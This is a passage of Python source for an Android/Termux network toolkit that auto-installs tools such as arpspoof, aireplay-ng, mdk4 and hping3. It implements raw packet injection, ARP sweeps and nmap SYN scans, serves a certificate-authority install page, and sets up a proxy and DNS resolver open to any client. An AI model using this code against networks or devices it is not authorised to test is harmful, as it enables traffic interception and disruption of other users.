    </div>

    <div class="warning">
        <strong>Security Note:</strong> This certificate authority is only for authorized testing on your own network and devices.
        Only install on devices you own and have permission to test.
    </div>
</body>
</html>
"""
    return html_content, 200, {'Content-Type': 'text/html; charset=utf-8'}

# ---------- tool management ----------
_INSTALLED_TOOLS = set()
_INSTALL_ATTEMPTED = set()

def detect_package_manager():
    if os.path.exists('/data/data/com.termux'):
        return ('pkg', 'install', '-y')
    if subprocess.call(['which', 'apt-get'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        return ('apt-get', 'install', '-y')
    if subprocess.call(['which', 'pacman'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        return ('pacman', '-S', '--noconfirm')
    if subprocess.call(['which', 'dnf'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        return ('dnf', 'install', '-y')
    if subprocess.call(['which', 'brew'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        return ('brew', 'install')
    return None

def install_package(pkg_name):
    if pkg_name in _INSTALL_ATTEMPTED:
        return pkg_name in _INSTALLED_TOOLS
    _INSTALL_ATTEMPTED.add(pkg_name)
    pm = detect_package_manager()
    if pm is None:
        add_log('error', f'No package manager found; cannot install {pkg_name}')
        return False

    # Define fallback chains for packages that have alternatives in Termux
    fallback_chains = {
        'dnscrypt-proxy': ['dnscrypt-proxy', 'unbound'],
        'tinyproxy': ['tinyproxy', 'squid-proxy', 'privoxy'],
    }

    packages_to_try = fallback_chains.get(pkg_name, [pkg_name])

    for pkg in packages_to_try:
        if tool_exists(pkg):
            _INSTALLED_TOOLS.add(pkg_name)
            add_log('info', f'{pkg_name} available via {pkg}')
            return True

        cmd = list(pm) + [pkg]
        try:
            add_log('info', f'Installing {pkg} ...')
            subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if tool_exists(pkg):
                _INSTALLED_TOOLS.add(pkg_name)
                add_log('success', f'{pkg_name} installed via {pkg}')
                return True
        except:
            add_log('info', f'Failed to install {pkg}, trying alternatives...')
            continue

    add_log('error', f'Failed to install {pkg_name} (tried: {", ".join(packages_to_try)})')
    return False

def tool_exists(name):
    """Check if tool exists and is executable."""
    try:
        out = subprocess.check_output(['which', name], stderr=subprocess.DEVNULL, text=True).strip()
        if not out:
            return False
        return os.access(out, os.X_OK)
    except:
        return False

def ensure_tool(tool_name, package_name=None):
    if tool_exists(tool_name):
        return True
    if package_name is None:
        package_name = tool_name
    pkg_map = {
        'arpspoof': 'dsniff',
        'aireplay-ng': 'aircrack-ng',
        'mdk4': 'mdk4',
        'hping3': 'hping3',
        'dhcpig': 'dhcpig',
        'iw': 'iw',
        'iptables': 'iptables',
        'nmap': 'nmap',
        'unbound': 'unbound',
        'dnscrypt-proxy': 'dnscrypt-proxy',
        'tinyproxy': 'tinyproxy',
        'ngrok': 'ngrok',
    }
    pkg = pkg_map.get(package_name, package_name)
    installed = install_package(pkg)
    if installed:
        # re-check executability after install
        return tool_exists(tool_name)
    return False

# ---------- network helpers ----------
def get_my_ip_and_cidr(iface):
    try:
        out = subprocess.check_output(['ip', '-o', '-4', 'addr', 'show', iface], text=True)
        for line in out.splitlines():
            if 'inet ' in line:
                parts = line.split()
                ip_cidr = parts[3]
                return ip_cidr.split('/')
    except:
        pass
    return ('0.0.0.0', '24')

def get_mac(iface):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', iface[:15].encode()))
        s.close()
        return info[18:24].hex(':')
    except:
        return '00:00:00:00:00:00'

# ---------- custom socket proxy layer with fallback chain ----------
# Ensures packet injection always works on Android by testing and caching
# the best available method: AF_PACKET (native) → AF_INET (raw IP) → SOCKS proxy
class SocketProxy:
    """
    Custom socket proxy: automatically selects and caches the most reliable
    packet injection method for the current Android device/driver state.
    Fallback chain: AF_PACKET → AF_INET → SOCKS tunneling.
    """
    _cache = {}  # {(iface, proto_type): working_method}

    @staticmethod
    def test_af_packet(iface, proto):
        """Test if AF_PACKET injection works on this interface."""
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(proto))
            sock.bind((iface, 0))
            sock.close()
            return True
        except (OSError, PermissionError) as e:
            add_log('dev', f'AF_PACKET test failed on {iface}: {e}')
            return False

    @staticmethod
    def test_af_inet(iface, proto):
        """Test if raw AF_INET injection works (IPPROTO_RAW)."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto or socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.close()
            return True
        except (OSError, PermissionError) as e:
            add_log('dev', f'AF_INET test failed on {iface}: {e}')
            return False

    @staticmethod
    def test_socks_fallback():
        """Test if SOCKS proxy is available (localhost:1080)."""
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.settimeout(1)
            test_sock.connect(('127.0.0.1', 1080))
            test_sock.close()
            return True
        except (OSError, TimeoutError) as e:
            add_log('dev', f'SOCKS proxy test failed (localhost:1080): {e}')
            return False

    @staticmethod
    def get_working_method(iface, proto_type='eth'):
        """
        Determine and cache the best working packet injection method.
        Returns: ('af_packet' | 'af_inet' | 'socks' | None, detailed_info)
        """
        key = (iface, proto_type)
        if key in SocketProxy._cache:
            return SocketProxy._cache[key]

        result = None
        info = []

        # Try AF_PACKET first (most reliable, native injection)
        if SocketProxy.test_af_packet(iface, 0x0003):
            result = ('af_packet', 'native AF_PACKET injection')
            info.append('✓ AF_PACKET available')
        # Fall back to AF_INET (raw IP sockets)
        elif SocketProxy.test_af_inet(iface, None):
            result = ('af_inet', 'raw IPPROTO_RAW injection')
            info.append('✓ AF_INET (raw IP) available')
        # Last resort: SOCKS proxy tunneling
        elif SocketProxy.test_socks_fallback():
            result = ('socks', 'SOCKS5 proxy tunneling')
            info.append('✓ SOCKS proxy available (localhost:1080)')
        else:
            result = (None, 'no working injection method available')
            info.append('✗ No injection methods available')

        SocketProxy._cache[key] = result
        add_log('dev', f'Socket proxy for {iface} ({proto_type}): {result[1]} — {", ".join(info)}')
        return result

    @staticmethod
    def send_packet(data, iface=None, dst_mac=None, method=None):
        """
        Send a packet with automatic fallback. If method not specified, auto-detect.
        Returns: (success: bool, method_used: str, error: str or None)
        """
        if not iface:
            return (False, 'unknown', 'interface required')

        # Auto-detect if not specified
        if not method:
            method, info = SocketProxy.get_working_method(iface, 'eth')
            if not method:
                return (False, 'none', info)

        try:
            if method == 'af_packet':
                sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
                sock.bind((iface, 0))
                sock.send(data)
                sock.close()
                return (True, 'af_packet', None)
            elif method == 'af_inet':
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sock.sendto(data, (data[16:20], 0))  # dst IP from packet
                sock.close()
                return (True, 'af_inet', None)
            elif method == 'socks':
                # SOCKS5 proxy fallback (requires local proxy on :1080)
                proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                proxy_sock.connect(('127.0.0.1', 1080))
                proxy_sock.sendall(data)
                proxy_sock.close()
                return (True, 'socks', None)
            else:
                return (False, method, f'unknown method: {method}')
        except Exception as e:
            add_log('dev', f'Socket send failed ({method}): {str(e)}')
            return (False, method, str(e))

# ---------- end socket proxy layer ----------

def arp_scan(iface, my_ip, cidr):
    results = []
    net = ipaddress.IPv4Network(f'{my_ip}/{cidr}', strict=False)
    src_mac = bytes.fromhex(get_mac(iface).replace(':', ''))

    def arp_packet(src_mac, src_ip, dst_ip):
        eth = b'\xff' * 6 + src_mac + struct.pack('!H', 0x0806)
        arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, 1)
        arp += src_mac + socket.inet_aton(src_ip)
        arp += b'\x00' * 6 + socket.inet_aton(dst_ip)
        return eth + arp

    sock = None
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
        sock.bind((iface, 0))
        sock.setblocking(0)
        add_log('dev', f'ARP scan using AF_PACKET socket on {iface}')
    except (OSError, PermissionError) as e:
        add_log('warn', f'AF_PACKET socket failed on {iface} ({e}); attempting fallback methods')
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.setblocking(0)
            add_log('dev', f'ARP scan falling back to AF_INET (raw IP) on {iface}')
        except (OSError, PermissionError) as e2:
            add_log('error', f'Both AF_PACKET and AF_INET failed for ARP scan ({e2}); skipping scan')
            return results

    # Cap the sweep so a misconfigured/wide interface CIDR (e.g. a /16 or /8 from
    # USB tethering or an unusual setup) can't turn into a multi-thousand-host
    # blast that freezes the phone. A home LAN is a /24 (254 hosts); 4096 covers
    # up to a /20 while still bounding the worst case.
    MAX_SCAN_HOSTS = 4096
    hosts = []
    for h in net.hosts():
        ip_str = str(h)
        # CRITICAL: Skip the device's own IP - don't ARP scan yourself
        if ip_str == my_ip:
            continue
        hosts.append(ip_str)
        if len(hosts) >= MAX_SCAN_HOSTS:
            add_log('warn', f'ARP scan capped at {MAX_SCAN_HOSTS} hosts (network {net} is larger); scan the subnet directly for full coverage')
            break
    batch_size = 64
    max_retries = 3
    global_deadline = time.time() + 8.0
    unreplied = set(hosts)
    retry_count = {ip: 0 for ip in hosts}
    seen = {}

    while unreplied and time.time() < global_deadline:
        batch = list(unreplied)[:batch_size]

        for ip in batch:
            try:
                sock.send(arp_packet(src_mac, my_ip, ip))
                retry_count[ip] += 1
            except OSError as e:
                add_log('dev', f'ARP packet send failed for {ip} (attempt {retry_count[ip]+1}): {e}')
                unreplied.discard(ip)

        batch_deadline = time.time() + 0.8
        while time.time() < batch_deadline:
            try:
                r, _, _ = select.select([sock], [], [], 0.05)
                if r:
                    data, _ = sock.recvfrom(65535)
                    if len(data) >= 42 and struct.unpack('!H', data[12:14])[0] == 0x0806:
                        if struct.unpack('!H', data[20:22])[0] == 2:
                            sip = socket.inet_ntoa(data[28:32])
                            smac = data[22:28]
                            if sip != my_ip and smac != b'\x00' * 6:
                                mac = smac.hex(':')
                                if sip not in seen:
                                    seen[sip] = mac
                                    results.append({'ip': sip, 'mac': mac})
                                unreplied.discard(sip)
            except OSError as e:
                add_log('dev', f'ARP receive error: {e}')
                break

        time.sleep(0.01)

        unreplied = {ip for ip in unreplied if retry_count.get(ip, 0) < max_retries and time.time() < global_deadline}

    if sock:
        try:
            sock.close()
        except:
            pass
    return results

def get_gateway_mac(iface, gateway_ip):
    try:
        out = subprocess.check_output(['ip', 'neigh', 'show', gateway_ip], text=True)
        m = re.search(r'(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})', out)
        if m:
            return m.group(1)
    except:
        pass
    my_ip, cidr = get_my_ip_and_cidr(iface)
    hosts = arp_scan(iface, my_ip, cidr)
    for h in hosts:
        if h['ip'] == gateway_ip:
            return h['mac']
    return None

def server_ping(ip, timeout=1):
    try:
        subprocess.check_output(['ping', '-c', '1', '-W', str(timeout), ip],
                                stderr=subprocess.DEVNULL, timeout=timeout+1)
        return True
    except:
        return False

def server_tcp_connect(ip, port, timeout=1):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((ip, port))
        s.close()
        return result == 0
    except:
        return False

# ---------- nmap recon ----------
def parse_nmap_output(output):
    ports = []
    in_table = False
    for line in output.splitlines():
        if line.startswith('PORT'):
            in_table = True
            continue
        if not in_table:
            continue
        stripped = line.strip()
        if not stripped or stripped.startswith('Nmap done'):
            break
        m = re.match(r'^(\d+)/(tcp|udp)\s+(\S+)\s+(\S+)\s*(.*)$', stripped)
        if m:
            ports.append({
                'port': int(m.group(1)),
                'protocol': m.group(2),
                'state': m.group(3),
                'service': m.group(4),
                'version': m.group(5).strip(),
            })
    return ports

def run_nmap_scan(ip, full=False):
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        raise ValueError('Invalid IP')
    if not ensure_tool('nmap'):
        raise RuntimeError('nmap is not installed and could not be installed automatically')
    cmd = ['nmap', '-sS', '-sV', '-T4', '-Pn']
    cmd += ['-p-'] if full else ['-F', '--version-intensity', '2']
    cmd += [ip]
    timeout = 900 if full else 180
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        raise RuntimeError(f'Nmap scan timed out after {timeout}s')
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f'Nmap exited with an error: {e.output.strip()[-300:]}')
    return parse_nmap_output(out)

# ---------- bandwidth ----------
def get_iface_bytes(iface):
    try:
        with open('/proc/net/dev') as f:
            for line in f:
                if ':' not in line:
                    continue
                name, data = line.split(':', 1)
                if name.strip() != iface:
                    continue
                fields = data.split()
                return int(fields[0]), int(fields[8])
    except:
        pass
    return None

# ---------- gateway: shared helpers ----------
def proc_running(name):
    try:
        return subprocess.run(['pgrep', '-x', name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0
    except:
        return False

def stop_proc(name):
    subprocess.run(['pkill', '-9', '-x', name], stderr=subprocess.DEVNULL)

def get_local_ip():
    iface = get_state('interface')
    if iface:
        ip, _ = get_my_ip_and_cidr(iface)
        if ip and ip != '0.0.0.0':
            return ip
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '0.0.0.0'

_EXTERNAL_IP_CACHE = {'ip': None, 'time': 0}
def get_external_ip():
    now = time.time()
    if _EXTERNAL_IP_CACHE['ip'] and now - _EXTERNAL_IP_CACHE['time'] < 300:
        return _EXTERNAL_IP_CACHE['ip']
    try:
        req = urllib.request.Request('https://api.ipify.org', headers={'User-Agent': 'GodHand'})
        with urllib.request.urlopen(req, timeout=5) as r:
            ip = r.read().decode().strip()
        _EXTERNAL_IP_CACHE['ip'] = ip
        _EXTERNAL_IP_CACHE['time'] = now
        return ip
    except:
        return _EXTERNAL_IP_CACHE['ip'] or 'Unknown'

def simple_dns_query(domain, server='127.0.0.1', port=53, timeout=3):
    txid = random.randint(0, 65535)
    header = struct.pack('!HHHHHH', txid, 0x0100, 1, 0, 0, 0)
    qname = b''.join(struct.pack('B', len(p)) + p.encode() for p in domain.strip('.').split('.')) + b'\x00'
    question = qname + struct.pack('!HH', 1, 1)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(header + question, (server, port))
        data, _ = s.recvfrom(512)
    finally:
        s.close()
    _, flags, _, ancount = struct.unpack('!HHHH', data[:8])
    return {'rcode': flags & 0x000F, 'answer_count': ancount}

# ---------- gateway: DNS privacy stack ----------
def fetch_blocklist_domains():
    try:
        req = urllib.request.Request(
            'https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts',
            headers={'User-Agent': 'GodHand'})
        with urllib.request.urlopen(req, timeout=20) as r:
            text = r.read().decode('utf-8', 'ignore')
        # Only "0.0.0.0 <domain>" lines are the actual blocklist body; a leading
        # "127.0.0.1 localhost"-style block is boilerplate, not domains to block.
        skip = {'0.0.0.0', 'localhost', 'localhost.localdomain', 'local', 'broadcasthost'}
        domain_re = re.compile(r'^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)+$')
        domains = []
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split()
            if len(parts) >= 2 and parts[0] == '0.0.0.0':
                d = parts[1].strip().lower()
                if d not in skip and domain_re.match(d):
                    domains.append(d)
        return domains or list(DEFAULT_BLOCKED_DOMAINS)
    except Exception as e:
        add_log('warn', f'Blocklist fetch failed, using built-in list: {e}')
        return list(DEFAULT_BLOCKED_DOMAINS)

def write_gateway_configs(domains, lan_domains=None):
    os.makedirs(GATEWAY_DIR, exist_ok=True)
    if lan_domains is None:
        lan_domains = ['pac.installCA.lan']

    with open(GW_BLOCKLIST_CONF, 'w') as f:
        for d in domains:
            f.write(f'local-zone: "{d}." always_nxdomain\n')

    dnscrypt_toml = textwrap.dedent(f"""\
        listen_addresses = ['127.0.0.1:{GW_DNSCRYPT_PORT}']
        server_names = ['cloudflare', 'quad9-dnscrypt-ip4-filter-pri']
        ipv4_servers = true
        ipv6_servers = false
        dnscrypt_servers = true
        doh_servers = true
        require_dnssec = true
        require_nolog = true
        cache = true
        cache_size = 4096
        [sources.'public-resolvers']
        urls = ['https://raw.githubusercontent.com/DNSCrypt/dnscrypt-resolvers/master/v3/public-resolvers.md']
        cache_file = '{GATEWAY_DIR}/public-resolvers.md'
        minisign_key = 'RWQf6LRCGA9i53mlYecO4IzT51TGPpvWucNSCh1CBM0QTaLn73Y7GFO3'
        refresh_delay = 72
        prefix = ''
    """)
    with open(GW_DNSCRYPT_CONF, 'w') as f:
        f.write(dnscrypt_toml)

    # Get local device IP for .lan domain resolution
    local_ip = get_local_ip()

    # Build local-zone entries for .lan domains
    lan_zones = []
    for lan_domain in lan_domains:
        lan_zones.append(f'            local-zone: "{lan_domain}." static')
        lan_zones.append(f'            local-data: "{lan_domain}. 300 IN A {local_ip}"')
        lan_zones.append(f'            local-data-ptr: "{local_ip} 300 IN PTR {lan_domain}."')

    lan_zones_str = '\n'.join(lan_zones) if lan_zones else ''

    unbound_conf = textwrap.dedent(f"""\
        server:
            interface: 0.0.0.0@{GW_DNS_PORT}
            access-control: 0.0.0.0/0 allow
            do-ip4: yes
            do-ip6: no
            do-udp: yes
            do-tcp: yes
            harden-dnssec-stripped: yes
            qname-minimisation: yes
            hide-identity: yes
            hide-version: yes
            use-caps-for-id: yes
            cache-min-ttl: 300
            do-not-query-localhost: no
            username: ""
            chroot: ""
            pidfile: "{GATEWAY_DIR}/unbound.pid"
            logfile: "{GATEWAY_DIR}/unbound.log"
            include: "{GW_BLOCKLIST_CONF}"
        {lan_zones_str}
        forward-zone:
            name: "."
            forward-addr: 127.0.0.1@{GW_DNSCRYPT_PORT}
    """)
    with open(GW_UNBOUND_CONF, 'w') as f:
        f.write(unbound_conf)

def gateway_blocklist_count():
    try:
        with open(GW_BLOCKLIST_CONF) as f:
            return sum(1 for _ in f)
    except:
        return 0

def gateway_dns_status():
    return {
        'unbound': proc_running('unbound'),
        'dnscrypt': proc_running('dnscrypt-proxy'),
        'blocklist_domains': gateway_blocklist_count(),
    }

def start_gateway_dns():
    if not ensure_tool('unbound'):
        raise RuntimeError('unbound could not be installed')
    if not os.path.exists(GW_BLOCKLIST_CONF):
        with STATE_LOCK:
            lan_domains = STATE.get('lan_domains', ['pac.installCA.lan'])
        write_gateway_configs(list(DEFAULT_BLOCKED_DOMAINS), lan_domains=lan_domains)
    stop_proc('dnscrypt-proxy')
    stop_proc('unbound')
    time.sleep(0.3)

    dnscrypt_available = ensure_tool('dnscrypt-proxy')
    dnscrypt_proc = None

    if dnscrypt_available and tool_exists('dnscrypt-proxy'):
        try:
            dnscrypt_proc = subprocess.Popen(['dnscrypt-proxy', '-config', GW_DNSCRYPT_CONF],
                                            stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            time.sleep(1.5)
            if dnscrypt_proc.poll() is not None:
                err = dnscrypt_proc.stderr.read().decode(errors='ignore')[-400:]
                add_log('warning', f'dnscrypt-proxy failed to start: {err}, falling back to unbound only')
                dnscrypt_proc = None
        except Exception as e:
            add_log('warning', f'Failed to start dnscrypt-proxy: {e}, falling back to unbound only')
            dnscrypt_proc = None

    unbound_proc = subprocess.Popen(['unbound', '-c', GW_UNBOUND_CONF, '-d'],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    time.sleep(1)
    if unbound_proc.poll() is not None:
        err = unbound_proc.stderr.read().decode(errors='ignore')[-400:]
        if dnscrypt_proc:
            stop_proc('dnscrypt-proxy')
        raise RuntimeError(f'unbound failed to start: {err}')

    if dnscrypt_proc:
        add_log('success', 'Gateway DNS stack started (Unbound + DNSCrypt-proxy)')
    else:
        add_log('success', 'Gateway DNS stack started (Unbound only - dnscrypt-proxy unavailable)')

def stop_gateway_dns():
    stop_proc('unbound')
    stop_proc('dnscrypt-proxy')
    add_log('info', 'Gateway DNS stack stopped')

def test_gateway_dns():
    results = {}
    for domain, expect_block in [('google.com', False), ('doubleclick.net', True)]:
        try:
            r = simple_dns_query(domain, '127.0.0.1', GW_DNS_PORT, timeout=3)
            blocked = r['rcode'] == 3 or r['answer_count'] == 0
            results[domain] = {'blocked': blocked, 'expected_block': expect_block, 'ok': blocked == expect_block}
        except Exception as e:
            results[domain] = {'blocked': None, 'expected_block': expect_block, 'ok': False, 'error': str(e)}
    return results

# ---------- gateway: VPN detection ----------
def gateway_vpn_status():
    wg_active = False
    try:
        out = subprocess.check_output(['ip', 'link', 'show', 'wg0'], stderr=subprocess.DEVNULL, text=True)
        wg_active = 'UP' in out.split('<', 1)[-1].split('>', 1)[0] if '<' in out else False
    except:
        pass
    openvpn_active = proc_running('openvpn')
    cloudflared_active = proc_running('cloudflared')
    return {
        'wireguard': wg_active,
        'openvpn': openvpn_active,
        'cloudflared': cloudflared_active,
        'active': wg_active or openvpn_active or cloudflared_active,
    }

# ---------- gateway: network-wide proxy ----------
def write_tinyproxy_conf():
    os.makedirs(GATEWAY_DIR, exist_ok=True)
    conf = textwrap.dedent(f"""\
        Port {GW_PROXY_PORT}
        Listen 0.0.0.0
        Timeout 600
        MaxClients 100
        Allow 0.0.0.0/0
        PidFile "{GATEWAY_DIR}/tinyproxy.pid"
        LogFile "{GATEWAY_DIR}/tinyproxy.log"
    """)
    with open(GW_TINYPROXY_CONF, 'w') as f:
        f.write(conf)

def gateway_proxy_status():
    return {'tinyproxy': proc_running('tinyproxy'), 'port': GW_PROXY_PORT}

def start_gateway_proxy():
    if not ensure_tool('tinyproxy'):
        raise RuntimeError('tinyproxy could not be installed')
    if not os.path.exists(GW_TINYPROXY_CONF):
        write_tinyproxy_conf()
    stop_proc('tinyproxy')
    time.sleep(0.3)
    proc = subprocess.Popen(['tinyproxy', '-c', GW_TINYPROXY_CONF, '-d'],
                             stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    time.sleep(1)
    if proc.poll() is not None:
        err = proc.stderr.read().decode(errors='ignore')[-400:]
        raise RuntimeError(f'tinyproxy failed to start: {err}')
    add_log('success', f'Gateway proxy started on port {GW_PROXY_PORT}')

def stop_gateway_proxy():
    stop_proc('tinyproxy')
    add_log('info', 'Gateway proxy stopped')

# ---------- gateway: dynamic DNS (DuckDNS / No-IP) ----------
def ddns_update_duckdns(domain, token):
    """https://www.duckdns.org/spec.jsp -- plain-text 'OK'/'KO' response."""
    domain = domain.strip().removesuffix('.duckdns.org')
    url = ('https://www.duckdns.org/update?domains=' + urllib.parse.quote(domain) +
           '&token=' + urllib.parse.quote(token) + '&ip=')
    req = urllib.request.Request(url, headers={'User-Agent': 'GodHand'})
    with urllib.request.urlopen(req, timeout=10) as r:
        body = r.read().decode('utf-8', 'ignore').strip()
    return body.upper().startswith('OK'), body

def ddns_update_noip(hostname, username, password):
    """No-IP Dynamic Update API -- HTTP Basic Auth, plain-text 'good <ip>'/'nochg <ip>'/error code."""
    url = 'https://dynupdate.no-ip.com/nic/update?hostname=' + urllib.parse.quote(hostname)
    req = urllib.request.Request(url, headers={'User-Agent': 'GodHand-DDNS/1.0'})
    auth = base64.b64encode(f'{username}:{password}'.encode()).decode()
    req.add_header('Authorization', f'Basic {auth}')
    with urllib.request.urlopen(req, timeout=10) as r:
        body = r.read().decode('utf-8', 'ignore').strip()
    ok = body.split()[0] in ('good', 'nochg') if body else False
    return ok, body

def ddns_perform_update():
    cfg = get_state('ddns')
    provider = cfg.get('provider')
    if provider not in ('duckdns', 'noip'):
        return
    # last_update marks the last *attempt*, success or not -- the supervisor loop uses
    # it to pace retries to the configured interval, so a failing provider never gets
    # hammered every 30s (that's how DDNS accounts get rate-limited or flagged for abuse).
    try:
        if provider == 'duckdns':
            ok, msg = ddns_update_duckdns(cfg['domain'], cfg['token'])
        else:
            ok, msg = ddns_update_noip(cfg['domain'], cfg['username'], cfg['password'])
        with STATE_LOCK:
            if ok:
                STATE['ddns']['last_ip'] = get_external_ip()
            STATE['ddns']['last_update'] = time.strftime('%Y-%m-%d %H:%M:%S')
            STATE['ddns']['last_status'] = 'ok' if ok else 'error'
            STATE['ddns']['last_message'] = msg
        add_log('success' if ok else 'error', f'DDNS update ({provider}): {msg}')
    except Exception as e:
        with STATE_LOCK:
            STATE['ddns']['last_update'] = time.strftime('%Y-%m-%d %H:%M:%S')
            STATE['ddns']['last_status'] = 'error'
            STATE['ddns']['last_message'] = str(e)
        add_log('error', f'DDNS update failed: {e}')

def ddns_supervisor_loop():
    """Background daemon: wakes periodically, updates when enabled and due. Never runs unless enabled."""
    while True:
        time.sleep(30)
        try:
            cfg = get_state('ddns')
            if not cfg or not cfg.get('enabled') or cfg.get('provider') not in ('duckdns', 'noip'):
                continue
            interval_s = max(60, int(cfg.get('interval_minutes') or 5) * 60)
            last = cfg.get('last_update')
            due = True
            if last:
                try:
                    due = (time.time() - time.mktime(time.strptime(last, '%Y-%m-%d %H:%M:%S'))) >= interval_s
                except:
                    due = True
            if due:
                ddns_perform_update()
        except Exception as e:
            add_log('error', f'DDNS supervisor error: {e}')

def ddns_bootstrap_from_env():
    """Load DDNS config from GODHAND_DDNS_* env vars at startup.

    The UI's DDNS settings only live in STATE (in-memory) -- they're gone the
    next time this script is restarted (phone reboot, Termux session killed,
    battery-optimization kill, etc.), silently turning auto-update back off
    with no indication anything changed. Env vars are the one config path
    that survives every restart, so they're the supported way to keep DDNS
    running unattended; the UI form is still there for one-off/interactive use.
    """
    provider = os.environ.get('GODHAND_DDNS_PROVIDER', '').strip().lower()
    if provider not in ('duckdns', 'noip'):
        if provider:
            print(f"WARNING: GODHAND_DDNS_PROVIDER={provider!r} is invalid (must be 'duckdns' or 'noip') -- ignoring DDNS env config.")
        return
    domain = os.environ.get('GODHAND_DDNS_DOMAIN', '').strip()
    if not domain:
        print("WARNING: GODHAND_DDNS_PROVIDER is set but GODHAND_DDNS_DOMAIN is missing -- ignoring DDNS env config.")
        return
    token = os.environ.get('GODHAND_DDNS_TOKEN', '').strip()
    username = os.environ.get('GODHAND_DDNS_USERNAME', '').strip()
    password = os.environ.get('GODHAND_DDNS_PASSWORD', '').strip()
    if provider == 'duckdns' and not token:
        print("WARNING: GODHAND_DDNS_PROVIDER=duckdns but GODHAND_DDNS_TOKEN is missing -- ignoring DDNS env config.")
        return
    if provider == 'noip' and not (username and password):
        print("WARNING: GODHAND_DDNS_PROVIDER=noip but GODHAND_DDNS_USERNAME/GODHAND_DDNS_PASSWORD are missing -- ignoring DDNS env config.")
        return
    try:
        interval = max(1, int(os.environ.get('GODHAND_DDNS_INTERVAL_MINUTES', 5)))
    except ValueError:
        interval = 5
    enabled_raw = os.environ.get('GODHAND_DDNS_ENABLED', '1').strip().lower()
    enabled = enabled_raw not in ('0', 'false', 'no', 'off')
    with STATE_LOCK:
        STATE['ddns']['provider'] = provider
        STATE['ddns']['domain'] = domain
        STATE['ddns']['token'] = token or None
        STATE['ddns']['username'] = username or None
        STATE['ddns']['password'] = password or None
        STATE['ddns']['interval_minutes'] = interval
        STATE['ddns']['enabled'] = enabled
    print(f"DDNS: loaded {provider} config for {domain} from environment (auto-update {'on' if enabled else 'off'}, every {interval}m).")
    add_log('info', f'DDNS configured from environment: {provider} / {domain}')

# ---------- gateway: remote tunnel (ngrok) ----------
def start_ngrok_tunnel(port, authtoken=None):
    if not ensure_tool('ngrok'):
        raise RuntimeError(
            "ngrok isn't installed and isn't available through this system's package manager "
            "(it isn't a standard distro package). Install it manually from ngrok.com, run "
            "'ngrok config add-authtoken <token>' once, then try again."
        )
    if authtoken:
        subprocess.run(['ngrok', 'config', 'add-authtoken', authtoken],
                        stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=10)
    stop_proc('ngrok')
    time.sleep(0.3)
    proc = subprocess.Popen(['ngrok', 'http', str(port), '--log=stdout'],
                             stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    time.sleep(2)
    if proc.poll() is not None:
        err = proc.stderr.read().decode(errors='ignore')[-400:] if proc.stderr else ''
        raise RuntimeError(f'ngrok failed to start: {err}')
    return proc

def get_ngrok_public_url():
    """ngrok exposes its own local status API on 127.0.0.1:4040 while running."""
    try:
        req = urllib.request.Request('http://127.0.0.1:4040/api/tunnels', headers={'User-Agent': 'GodHand'})
        with urllib.request.urlopen(req, timeout=3) as r:
            data = json.loads(r.read().decode())
        tunnels = data.get('tunnels', [])
        for t in tunnels:
            if t.get('proto') == 'https':
                return t.get('public_url')
        return tunnels[0].get('public_url') if tunnels else None
    except:
        return None

# ---------- monitor mode ----------
def set_monitor(iface, enable=True, raise_on_fail=False):
    """Attempt to set monitor mode. Returns True on success, False otherwise."""
    mode = 'monitor' if enable else 'managed'
    try:
        subprocess.run(['iw', 'dev', iface, 'set', 'type', mode],
                       check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        if enable:
            time.sleep(0.5)
            out = subprocess.check_output(['iw', 'dev', iface, 'info'], text=True)
            if 'type monitor' not in out:
                raise RuntimeError(f'Failed to set monitor mode on {iface}')
        return True
    except subprocess.CalledProcessError as e:
        if raise_on_fail:
            raise RuntimeError(f'Monitor mode change failed (exit {e.returncode}). Interface may not support monitor mode.')
        return False
    except Exception as e:
        if raise_on_fail:
